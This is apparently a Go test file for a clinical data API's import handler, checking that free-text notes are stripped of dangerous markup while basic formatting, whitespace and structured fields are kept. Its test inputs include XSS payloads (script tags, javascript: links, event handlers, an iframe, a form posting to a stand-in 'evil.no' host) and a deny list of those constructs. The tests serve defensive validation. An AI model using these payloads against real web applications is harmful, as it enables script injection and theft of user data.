package dataapi

import (
	"net/url"
	"strings"
	"testing"
)

// The §5.2 allowlist proven on the real write path rather than in unit isolation:
// REQ-VAL-030 promises that every entry path stores sanitized bytes, and all three
// paths (data API import, UI data entry through PHP, survey link submission) arrive
// at this one import handler — so what a stored free-text value holds is decided
// here. The fixture's `notes` field is a `text` field with no validation type, i.e.
// free-form text under §5.

func importNote(t *testing.T, f *recordFixture, recordID, value string) importRow {
	t.Helper()
	rows := f.importRows(t, url.Values{
		"token": {"tok-edit"}, "content": {"record"}, "action": {"import"}, "returnFormat": {"json"},
		"data[0][record_id]":  {recordID},
		"data[0][form_name]":  {"demo"},
		"data[0][event_name]": {"baseline_arm_1"},
		"data[0][notes]":      {value},
	})
	return rows[0]
}

// Markup that would be dangerous rendered is gone from the stored value, while the
// allowlisted formatting REQ-VAL-031 exists to keep survives.
func TestImportSanitizesFreeText(t *testing.T) {
	f := newRecordFixture(t)

	cases := []struct{ in, want string }{
		{"hello <b>world</b>", "hello <b>world</b>"},
		{"<script>steal()</script>a &amp; b", "a &amp; b"},
		{`<a href="javascript:alert(1)">x</a>`, "x"},
		{"<img src=x onerror=alert(1)>", ""},
		{`<p onclick="steal()" class="x">text</p>`, "<p>text</p>"},
		{`<div>note: <a href="https://x.no">link</a></div>`, `note: <a href="https://x.no">link</a>`},
	}
	for i, c := range cases {
		rec := "8DISC0" + string(rune('1'+i))
		importNote(t, f, rec, c.in)
		got := storedValue(t, f, rec, "baseline_arm_1", "notes")
		if got != c.want {
			t.Errorf("import %q stored %q, want %q", c.in, got, c.want)
		}
	}
}

// The point of the policy is that no dangerous construct reaches storage, so a
// value cannot be rendered as markup later. Asserted directly as well as through
// the exact-output cases above, because those name one expected serialization
// while this names the invariant.
func TestImportStoresNoExecutableMarkup(t *testing.T) {
	f := newRecordFixture(t)
	imports := []string{
		`<script src="https://evil.no/a.js"></script>note`,
		`<b onmouseover="steal()">hover</b>`,
		`<iframe src="https://evil.no"></iframe>`,
		`<form action="https://evil.no/collect"><input name="x"></form>`,
		`<a href="data:text/html,<script>alert(1)</script>">click</a>`,
		`<style>body{display:none}</style>`,
	}
	for i, in := range imports {
		rec := "8DISC0" + string(rune('A'+i))
		importNote(t, f, rec, in)
		got := storedValue(t, f, rec, "baseline_arm_1", "notes")
		for _, bad := range []string{"<script", "onmouseover", "<iframe", "<form", "<input", "evil.no", "<style", "javascript:", "data:text/html"} {
			if strings.Contains(strings.ToLower(got), bad) {
				t.Errorf("import %q stored %q, which still contains %q", in, got, bad)
			}
		}
	}
}

// §5.1 steps 1–3 reject instead of transforming: a value with a control character
// in it did not arrive the way the client meant it to, so the row is refused rather
// than silently cleaned.
func TestImportRejectsControlCharacters(t *testing.T) {
	f := newRecordFixture(t)
	res := importNote(t, f, "8DISC099", "note\x00with NUL")
	if res.ImportRecordID != 0 {
		t.Errorf("row with a NUL byte = %v, want it refused (ImportRecordID 0)", res)
	}
}

// Tab and line feed are legitimate in multi-line free text (§5.1 step 2 excepts
// them), and CR is normalized rather than rejected — the shape a Windows-origin
// clinical note arrives in.
func TestImportAcceptsOrdinaryWhitespace(t *testing.T) {
	f := newRecordFixture(t)
	importNote(t, f, "8DISC098", "line one\r\nline two\tindented")
	if got := storedValue(t, f, "8DISC098", "baseline_arm_1", "notes"); got != "line one\nline two\tindented" {
		t.Errorf("stored note = %q, want CR normalized to LF with tab kept", got)
	}
}

// A validated field is outside the policy's scope: `age` is an integer and
// `contact_email` an email, so neither is rewritten — sanitizing a structured value
// could corrupt it while there is no markup in it to remove.
func TestImportLeavesStructuredFieldsAlone(t *testing.T) {
	f := newRecordFixture(t)
	rows := f.importRows(t, url.Values{
		"token": {"tok-edit"}, "content": {"record"}, "action": {"import"}, "returnFormat": {"json"},
		"data[0][record_id]":     {"8DISC097"},
		"data[0][form_name]":     {"demo"},
		"data[0][event_name]":    {"baseline_arm_1"},
		"data[0][age]":           {"42"},
		"data[0][contact_email]": {"a@b.no"},
	})
	res := rows[0]
	if res.ImportRecordID == 0 {
		t.Fatalf("structured import refused: %v", res)
	}
	if got := storedValue(t, f, "8DISC097", "baseline_arm_1", "age"); got != "42" {
		t.Errorf("stored age = %q, want 42", got)
	}
	if got := storedValue(t, f, "8DISC097", "baseline_arm_1", "contact_email"); got != "a@b.no" {
		t.Errorf("stored email = %q, want a@b.no", got)
	}
}
